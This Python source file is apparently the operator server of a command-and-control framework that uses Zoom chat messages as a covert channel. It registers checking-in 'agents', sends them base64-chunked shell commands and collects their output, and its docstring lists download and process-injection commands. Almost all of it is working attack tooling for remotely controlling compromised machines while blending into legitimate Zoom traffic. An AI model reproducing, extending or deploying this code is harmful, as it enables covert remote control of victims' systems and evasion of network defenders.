import requests
import json
import time
import threading
import math
import base64
import configparser

'''
TODO
Make way to link message response and request together. Chance of failure if both outputs are sent before a get request is called 
'''


# overall class
class Comms:
  def __init__(self):
    # queue of post list of dict with key url, payload(WANT TO POST)
    self.post_message_queue = []

    # queue of get requests (WANT RESPONSE) 
    self.get_message_queue = []



    self.auth = authentication()   
     
  def main_loop(self):
    while True:
      if len(self.post_message_queue) > 0:
        self.send_message() 
        # only sleep after sending message, no need if no message send
        time.sleep(10) 

      # if no message to be sent then get messages 

      elif len(self.get_message_queue) > 0:
        self.get_message()
        time.sleep(10) 

      else:
        # if no action only need to sleep for 5 seconds
        time.sleep(5)

  '''
  MSG format
  {
    url - url to requst for
    caller - the function to send response to
  } 
  '''
  def get_message(self):
    if len(self.get_message_queue) != 0:
      message_dict = self.get_message_queue[0]
      
      url = message_dict['url']
      caller = message_dict['caller']
      headers = {
      'Authorization': f'Bearer {self.auth.access_token}'
      }
      response = requests.request("GET", url, headers=headers)
      if response.status_code != 200: 
        print(f'status error in get queue, {response.status_code =}, {message_dict=}')
        self.statusError(response.status_code)
        self.get_message()
      else:
        # remove from queue if get success
        self.get_message_queue.pop(0)
        # use the given caller function and send output back
        caller(response.json()) 

  '''
  MSG format
  {
    url  - url to send post to
    payload - the message body for the post request
  } 
  '''
  def send_message(self):   
    # check if queue is empty
    if len(self.post_message_queue) != 0:
      message_dict = self.post_message_queue[0]
      url = message_dict['url']
      payload = json.dumps(message_dict['payload'])
      headers = {
      'Authorization': f'Bearer {self.auth.access_token}',
      'Content-Type': 'application/json'
      }
      response = requests.request("POST", url, headers=headers, data=payload)
      
      if response.status_code != 201:
        print(f'status error in send queue, {response.status_code =}, {message_dict=}')
        self.statusError(response.status_code) 
        self.send_message()
      else:
        # if item sent then remove from queue
        self.post_message_queue.pop(0)
        


  def statusError(self,status_code):
    #TODO need to update logic with config.ini file
    if status_code == 429:
      print("Hit API Rate Limit, Sleeping for 5 seconds.")
      time.sleep(5)
      # reprint the console line for neatness
      print('>', end='')
    else: 
      print('status error, checking refresh token')
      if self.auth.refreshToken() == -1:
        print('Reauthentication Failed, update the API token located in config.ini')
        quit()




# class for authentication
class authentication:
  def __init__(self):
    try:
      print('getting config information')
      self.config = configparser.ConfigParser()
      self.config.read('config.ini')
      self.access_token = self.config['API']['access_token']
      self.refresh_token = self.config['API']['refresh_token']
      self.contact = self.config['API']['contact']
    except KeyError:
      print("Config.ini file missing or not configured correctly.")
      quit()
    
    #authenticate 
    if self.refreshToken() == -1:
      print('auth failed')
      exit()
    print('auth success')


  def updateTokens(self, at, rt):
      #write over the old token values and set them as the new variables
      self.config['API']['access_token'] = at
      self.config['API']['refresh_token'] = rt
      self.access_token = at
      self.refresh_token = rt
      with open('config.ini', 'w') as configfile:
        self.config.write(configfile) 
     
  def refreshToken(self):
      print('refreshing token')
      url = f"https://zoom.us/oauth/token?grant_type=refresh_token&refresh_token={self.refresh_token}"
      payload={}
      headers = {
        'Authorization': 'Basic ',
           } 
      response = requests.request("POST", url, headers=headers, data=payload) 
      if response.status_code == 200:
        apiToken = response.json().get("access_token")
        refreshApiToken = response.json().get("refresh_token")
        self.updateTokens(apiToken,refreshApiToken)

        return 1
      else: 
        return -1


class Command:

  def __init__(self, comms):
    self.comms = comms
    self.pendingMessage = {}
    self.agentNumber = '123456'
    self.serverNumber = '000000'
    #mainThread
    
    #dictionary of queues, key = agent# value=queue with messages
    self.agent_msg = {} 
    self.selected_agent = ''
    # True if get requst still in queue
    self.get_queue = False
    self.previousLast = ''

  # func to check and add a get request to Comms if waiting on msg
  def get_request(self): 
    # no need to send if a requst already in the queue
    if self.get_queue is not True:
      # check if there are queues waiting on a response
      for msg_queue in self.agent_msg.values():        
        if msg_queue.number_waiting() > 0:
          # get contact which is stored in the API file that auth accesses
          contact = self.comms.auth.contact    
          url = f'https://api.zoom.us/v2/chat/users/me/messages?to_contact={contact}'
          caller = self.parseOutput 
          msg_dict = {'url': url,
                      'caller': caller
                     }

          # send message dictionary to get queue in comms
          self.comms.get_message_queue.append(msg_dict)
        
          self.get_queue = True
          # once one is found request is sent no matter what so can break
          break

  def newCmd_loop(self):
    '''
    current commands are
    cmd: execute this command
    dnl: download
    inj: injects hexcode into specific process id
    '''
    #accept new input from user and add it to the userCmd list
    while True:

      user_input = input('> ')

      # general terminal view
      if self.selected_agent == '':
        if user_input =='list':
          for agent in self.agent_msg.keys():
            print(agent)
        # command to select agent 'select agent#'

        elif user_input.split()[0] == 'use':
          
          agent = user_input.split()[1]
          # check if agent exists
          if agent in self.agent_msg.keys():
            self.selected_agent = agent
          else:
            print(agent, "does not exist")

        else:
          print('help') 
          print('list - get list of active agents')
          print('use [agent_num] - changes to specific agent view') 
      # specific agent view
      else:
        # check agents msg history
        if user_input == 'msg':
          self.agent_msg[self.selected_agent].display_msg()
        # give agent new command
        elif user_input == 'cmd':
          cmd = input('cmd: ')

          # append cmd to msg queue so when printed output makes sense
          self.agent_msg[self.selected_agent].insert_msg(cmd)
          
          self.buildMsg('cmd:'+cmd, self.selected_agent) 
        # return to overview
        elif user_input == 'back':
          print('exiting agent view')
          self.selected_agent = ''
        else:
          print('help')
          print('msg - view agents sent messages')
          print('cmd - enter a command for the agent to recieve')
          print('back - exit agent view')

 

  def buildMsg(self, cmd, an):
    # //output format for message blocks
    #destination bit - 0(for S)/1(for C)
    # message format: destinationBit:clientnumber:current block:final block:b64 command 
    #https://stackoverflow.com/questions/9475241/split-string-every-nth-character

    b64 = (base64.b64encode(cmd.encode('utf-8'))).decode("utf-8") 
    n = 1000 #1024 max char limit for send api
    cmds = [b64[i:i+n] for i in range(0, len(b64), n)]
    roundedBlocks = len(cmds)
    i=1
    msg_dict = {'url':'https://api.zoom.us/v2/chat/users/me/messages',
                'payload':{'to_contact':self.comms.auth.contact}}
    for c in cmds:
      msg = '1' + ':' + str(an) + ':' + str(i) + ':' + str(roundedBlocks) + ':' + c
      
      msg_dict['payload']['message'] = msg 
      self.comms.post_message_queue.append(msg_dict)
      i = i + 1

  def parseOutput(self, jsonResponse):
    # no longer a get request in the queue 
    self.get_queue = False 

    #destination bit - 0(for S)/1(for C)
    # message format: destinationBit:clientnumber:current block:final block:b64 command
    #eg: 123456:1:1:d2luZGV2MjEwMWV2YWxcdXNlcg0K
    
    #split destination bit from rest of message
    messages = jsonResponse.get('messages')
    # iterate through all messages from the post reques
    for msg in messages:
      # if message id is previous last 
      print(f'{self.previousLast=}')
      if msg['id'] == self.previousLast:
        break
   
      destination, splitMsg = msg['message'].split(':', 1) 
      # if meant for server then continue
      if int(destination) == 0: 

        splitMsg = splitMsg.split(':')
        an = splitMsg[0]
        currentBlock = int(splitMsg[1])
        finalBlock = int(splitMsg[2])
        cmdOutput = splitMsg[3]
        dMsg = ''


        #if we have multiple blocks incoming store it and wait for the other ones, if it is the last block pop and print all of them
        if finalBlock > 1:
          if str(currentBlock) in self.pendingMessage: #TODO error handling for this case
            raise Exception("Multiple messages waiting to be displayed.")
          else:
            self.pendingMessage[str(currentBlock)] = cmdOutput
       
          if len(self.pendingMessage) == finalBlock:
              for i in range(finalBlock):
                dMsg = (base64.b64decode(self.pendingMessage.pop(str(i+1)))).decode("utf-8") 
                #print(dMsg)

        else:
          dMsg = (base64.b64decode(cmdOutput)).decode("utf-8") 
          #print(dMsg)

        # returns decrypted message
        if an in self.agent_msg.keys(): 
          #if agent has already been seen then append new message to queue of messages
          self.agent_msg[an].insert_msg(dMsg, server=False)
        else:
          # error agent hasn't been assigned yet.
          print("error agent has not been seen yet, but msg recieved")
          exit()
        
    # new previousLast is now the first message from list of read msg
    print(f'changed previous last to {messages[0]["id"]}')
      
    self.previousLast = messages[0]['id']    

class msg_queue:
  def __init__(self):
    self.msg_queue = [] 
    self.index_response = 0
    self.max_length = 100 #useful later when controlling output length

  def insert_msg(self, msg, server=True):
    # if msg is from server then simply append
    if server==True:
      #msg in format ['server request', 'agent response']
      # agent response is none til response recieved
      self.msg_queue.append([msg, None]) 
    # if message from agent then must properly place
    else:
      print(f'{self.index_response=}')
      print(f'{len(self.msg_queue)=}')
      self.msg_queue[self.index_response][1] = msg 
      # increment were next agent response goes by one
      self.index_response += 1

  def display_msg(self):
    print('-'*40)
    for i in self.msg_queue:
      print('S - '+ i[0]) # server message
      print('A - ' + i[1] if i[1] != None else 'A - Awaiting response')
    print('-'*40)
  
  def number_waiting(self):
    counter = 0
    for i in self.msg_queue:
      # increment counter for each message waiting on
      if i[1] == None:
        counter+=1 
    return counter

class Checkin:
  def __init__(self, Comms):
    self.comms = Comms
    self.current_agent = 100000 
    self.new_agents = []
    self.channels = [] 
    # most recent channel read so know when to stop
    self.previousLast = ''
    
  def main_loop(self):
    while True:
      url = 'https://api.zoom.us/v2/chat/users/me/channels'
      body = {}
      caller = self.parse_channel
      message_dict = {'url':url,
                      'caller': caller,
                     }
      # give the needed message_dict to comms
      self.comms.get_message_queue.append(message_dict)    
      time.sleep(25)
      

  def parse_channel(self, jsonResponse):
    # no channels to parse
    if jsonResponse.get('total_records') == 0:
      return 0
    for channel in jsonResponse.get('channels'):
      if channel['id'] == self.previousLast:
        break
      # add new channel to list of channels
      self.channels.append(channel['id'])

    # once channels have been parsed then send out assignemnt
    
    # first one in list is now cutoff before reading channells that have already been parsed
    self.previousLast = jsonResponse.get('channels')[0]['id']
    self.assign_an()    

 
  def assign_an(self):
    for i in self.channels:

      message_body={'message':str(self.current_agent),
                    'to_channel': i}   
      url = 'https://api.zoom.us/v2/chat/users/me/messages'
      message_dict = {'url': url,
                      'payload': message_body}      
      self.new_agents.append(str(self.current_agent))
      self.current_agent += 1

      # sends message to outgoing message queue
      self.comms.post_message_queue.append(message_dict)
      
      # clear out new channels array
      self.channels = []

if __name__ == '__main__':
  comms = Comms()
  command = Command(comms)
  checkin = Checkin(comms)
  command_thread = threading.Thread(target=command.newCmd_loop) 
  checkin_thread = threading.Thread(target=checkin.main_loop)
  comms_thread = threading.Thread(target=comms.main_loop)
  
  comms_thread.start()
  checkin_thread.start()
  command_thread.start()

  while True:
    time.sleep(5)
    if len(checkin.new_agents) > 0:
      for agent in checkin.new_agents:
        print('new agent found with #', agent)
        # create new message queue for start of interaction with agent
        command.agent_msg[agent] = msg_queue()
      
      # clear out all agents
      checkin.new_agents = []
    # run the get requests for command to check if msgs need to be found 
    command.get_request()



  
